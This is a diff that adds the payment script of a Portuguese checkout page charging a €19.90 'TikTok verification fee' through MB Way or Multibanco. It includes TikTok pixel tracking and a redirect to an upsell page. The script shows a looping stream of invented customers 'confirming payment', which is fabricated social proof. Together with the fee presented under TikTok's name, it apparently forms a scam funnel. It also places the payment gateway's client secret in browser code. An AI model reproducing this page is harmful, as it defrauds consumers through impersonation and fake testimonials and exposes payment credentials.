+        content_name: 'Taxa de Verificacao TikTok', value: CHECKOUT_AMOUNT, currency: CHECKOUT_CURRENCY, quantity: 1
+      });
+    }
+    function trackPurchase(txId) {
+      if (_alreadyFiredPixel('Purchase', txId)) return;
+      trackTikTokEvent('Purchase', {
+        content_type: 'product', content_id: 'tiktok_verificacao',
+        content_name: 'Taxa de Verificacao TikTok', value: CHECKOUT_AMOUNT, currency: CHECKOUT_CURRENCY, quantity: 1
+      });
+    }
+
+    trackInitiateCheckout();
+
+    // Create Transaction
+    async function createTransaction(method, phone) {
+      if (typeof sendEvent === 'function') sendEvent("add_payment_info", PRODUCT.price);
+
+      if (isTestPaidMode()) {
+        if (typeof sendEvent === 'function') sendEvent("lead", CHECKOUT_AMOUNT);
+        var mockId = 'TEST_PAID_' + Math.random().toString(36).slice(2, 8).toUpperCase();
+        return {
+          statusCode: 200, transactionID: mockId, id: mockId,
+          amount: CHECKOUT_AMOUNT, method: method,
+          referenceData: method === 'multibanco' ? { entity: '00000', reference: '000 000 000', expiresAt: '' } : undefined,
+          generatedMBWay: method === 'mbway'
+        };
+      }
+
+      if (!WAYMB_CONFIG.clientId || !WAYMB_CONFIG.clientSecret || !WAYMB_CONFIG.accountEmail) {
+        throw new Error('Configuracao ausente.');
+      }
+
+      var sessionId = typeof getSessionId === 'function' ? getSessionId() : 'sess_unknown';
+
+      var response = await fetch(WAYMB_CONFIG.baseUrl + '/transactions/create', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          client_id: WAYMB_CONFIG.clientId,
+          client_secret: WAYMB_CONFIG.clientSecret,
+          account_email: WAYMB_CONFIG.accountEmail,
+          amount: CHECKOUT_AMOUNT,
+          method: method,
+          payer: {
+            email: WAYMB_CONFIG.accountEmail,
+            name: 'Cliente',
+            document: '000000000',
+            phone: method === 'mbway' ? '+351' + phone : '912345678'
+          },
+          currency: CHECKOUT_CURRENCY,
+          metadata: { session_id: sessionId },
+          success_url: window.location.origin + '/up1/',
+          failed_url: window.location.origin + '?payment=failed'
+        })
+      });
+
+      if (!response.ok) {
+        var errorData = null;
+        try { errorData = await response.json(); } catch(_){}
+        throw new Error((errorData && (errorData.message || errorData.error)) || 'Erro ao criar transacao');
+      }
+
+      var data = await response.json();
+      if (typeof sendEvent === 'function') sendEvent("lead", CHECKOUT_AMOUNT);
+      notifyPushcut(method, CHECKOUT_AMOUNT, data.id || data.transactionID);
+      return data;
+    }
+
+    // Check Status
+    async function checkStatus(txId) {
+      if (isTestPaidMode()) return { id: txId, status: 'COMPLETED', amount: CHECKOUT_AMOUNT };
+      var response = await fetch(WAYMB_CONFIG.baseUrl + '/transactions/info', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: txId, client_id: WAYMB_CONFIG.clientId, client_secret: WAYMB_CONFIG.clientSecret })
+      });
+      if (!response.ok) throw new Error('Erro ao verificar status');
+      return await response.json();
+    }
+
+    // Polling
+    function startPolling(txId) {
+      var checkCount = 0;
+      var pollInterval = setInterval(async function() {
+        checkCount++;
+        try {
+          var status = await checkStatus(txId);
+          if (status.status === 'FAILED' || status.status === 'CANCELLED' || status.status === 'DECLINED') {
+            clearInterval(pollInterval);
+            showFailure();
+            return;
+          } else if (status.status === 'COMPLETED') {
+            clearInterval(pollInterval);
+            handleSuccess(txId);
+            return;
+          }
+        } catch (_) {}
+        if (checkCount >= 60) {
+          clearInterval(pollInterval);
+          showFailure();
+        }
+      }, 5000);
+    }
+
+    function handleSuccess(txId) {
+      trackCompletePayment(txId);
+      trackPurchase(txId);
+      if (typeof sendEvent === 'function') sendEvent("purchase", PRODUCT.price);
+      checkoutInstructions.style.display = 'none';
+      checkoutSuccess.style.display = 'block';
+      setTimeout(function() { window.location.href = window.location.origin + '/up1/'; }, 3000);
+    }
+
+    function showFailure() {
+      mbwayInstructions.style.display = 'none';
+      multibancoInstructions.style.display = 'none';
+      failureSection.style.display = 'block';
+    }
+
+    function showInstructions(transaction, method, phone) {
+      checkoutForm.style.display = 'none';
+      checkoutInstructions.style.display = 'block';
+      if (method === 'mbway') {
+        mbwayInstructions.style.display = 'block';
+        displayPhone.textContent = '+351' + phone;
+        trackGenerateLead('mbway', transaction.id || transaction.transactionID);
+      } else if (method === 'multibanco' && transaction.referenceData) {
+        multibancoInstructions.style.display = 'block';
+        var ref = transaction.referenceData;
+        function esc(s) { var d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+        var html = '';
+        html += '<div class="ck-reference-item"><span class="ck-reference-label">Entidade:</span><span class="ck-reference-value">' + esc(ref.entity) + '</span></div>';
+        html += '<div class="ck-reference-item"><span class="ck-reference-label">Referencia:</span><span class="ck-reference-value" id="refValue">' + esc(ref.reference) + '</span></div>';
+        html += '<div class="ck-reference-item"><span class="ck-reference-label">Valor:</span><span class="ck-reference-value">\u20AC' + CHECKOUT_AMOUNT.toFixed(2) + '</span></div>';
+        if (ref.expiresAt) {
+          html += '<div class="ck-reference-item"><span class="ck-reference-label">Valido ate:</span><span class="ck-reference-value">' + esc(ref.expiresAt) + '</span></div>';
+        }
+        multibancoReference.innerHTML = html;
+        trackGenerateLead('multibanco', transaction.id || transaction.transactionID);
+      }
+    }
+
+    function setMessage(text, type) {
+      messageBox.textContent = text || '';
+      messageBox.className = 'ck-message';
+      if (type) messageBox.classList.add(type);
+    }
+
+    // Pay button
+    var isSubmitting = false;
+    payBtn.addEventListener('click', async function() {
+      if (isSubmitting) return;
+      var selected = document.querySelector('input[name="payment-method"]:checked');
+      if (!selected) { setMessage('Seleciona um metodo de pagamento.', 'err'); return; }
+      var method = selected.value;
+      var phone = phoneInput ? phoneInput.value.replace(/\D/g, '') : '';
+      if (method === 'mbway' && phone.length < 9) {
+        setMessage('Numero invalido. Deve ter 9 digitos.', 'err');
+        if (phoneInput) phoneInput.focus();
+        return;
+      }
+      isSubmitting = true;
+      trackSubmitForm(method);
+      if (typeof sendEvent === 'function') sendEvent("payment_click", PRODUCT.price);
+      payBtn.disabled = true;
+      payBtn.textContent = 'A processar...';
+      setMessage('A gerar pagamento...', 'warn');
+      try {
+        var transaction = await createTransaction(method, phone);
+        transactionId = transaction.id || transaction.transactionID;
+        paymentMethod = method;
+        trackGenerateLead(method, transactionId);
+        showInstructions(transaction, method, phone);
+        startPolling(transactionId);
+      } catch (err) {
+        setMessage((err && err.message) || 'Erro ao processar pagamento.', 'err');
+        isSubmitting = false;
+        payBtn.disabled = false;
+        payBtn.textContent = 'PAGAR \u20AC19,90';
+      }
+    });
+
+    // Copy reference
+    if (copyRefBtn) {
+      copyRefBtn.addEventListener('click', function() {
+        var refEl = document.getElementById('refValue');
+        if (refEl) {
+          var text = refEl.textContent.trim();
+          (navigator.clipboard ? navigator.clipboard.writeText(text) : Promise.reject()).then(function() {
+            copyRefBtn.textContent = 'Copiado!';
+            setTimeout(function() { copyRefBtn.textContent = 'Copiar Referencia'; }, 2000);
+          }).catch(function() {
+            window.prompt('Copia a referencia:', text);
+          });
+        }
+        if (typeof sendEvent === 'function') sendEvent("pix_copy", PRODUCT.price);
+      });
+    }
+
+    // Retry
+    if (retryBtn) {
+      retryBtn.addEventListener('click', function() {
+        checkoutInstructions.style.display = 'none';
+        checkoutForm.style.display = 'block';
+        failureSection.style.display = 'none';
+        mbwayInstructions.style.display = 'none';
+        multibancoInstructions.style.display = 'none';
+        isSubmitting = false;
+        payBtn.disabled = false;
+        payBtn.textContent = 'PAGAR \u20AC19,90';
+        setMessage('', '');
+      });
+    }
+
+    // Toast notifications
+    var ckToastContainer = document.createElement('div');
+    ckToastContainer.className = 'ck-toast-container';
+    document.body.appendChild(ckToastContainer);
+
+    var ckToastPeople = [
+      { name: 'Catarina M.', initials: 'CM', color: '#8b5cf6' },
+      { name: 'Bruno T.', initials: 'BT', color: '#0891b2' },
+      { name: 'Daniela R.', initials: 'DR', color: '#e11d48' },
+      { name: 'Filipa S.', initials: 'FS', color: '#7c3aed' },
+      { name: 'Rui A.', initials: 'RA', color: '#dc2626' },
+      { name: 'Leonor V.', initials: 'LV', color: '#2563eb' },
+      { name: 'Nuno G.', initials: 'NG', color: '#ca8a04' },
+      { name: 'Marta C.', initials: 'MC', color: '#db2777' },
+      { name: 'Andre L.', initials: 'AL', color: '#4f46e5' },
+      { name: 'Sara B.', initials: 'SB', color: '#0d9488' }
+    ];
+    var ckToastIdx = 0;
+
+    function showCkToast() {
+      var p = ckToastPeople[ckToastIdx % ckToastPeople.length];
+      ckToastIdx++;
+      var toast = document.createElement('div');
+      toast.className = 'ck-toast';
+      toast.innerHTML = '<div class="ck-toast-avatar" style="background:' + p.color + ';">' + p.initials + '</div>' +
+        '<div class="ck-toast-text"><strong>' + p.name + '</strong> confirmou o pagamento</div>';
+      ckToastContainer.appendChild(toast);
+      setTimeout(function() {
+        toast.classList.add('ck-toast-exit');
+        setTimeout(function() { if (toast.parentNode) toast.parentNode.removeChild(toast); }, 300);
+      }, 3500);
+    }
+
+    setTimeout(showCkToast, 5000);
+    setInterval(showCkToast, 15000);
+
+  })();
+  </script>
+
+  <script src="js/pixel-tiktok.js" async defer></script>
+</body>
+</html>
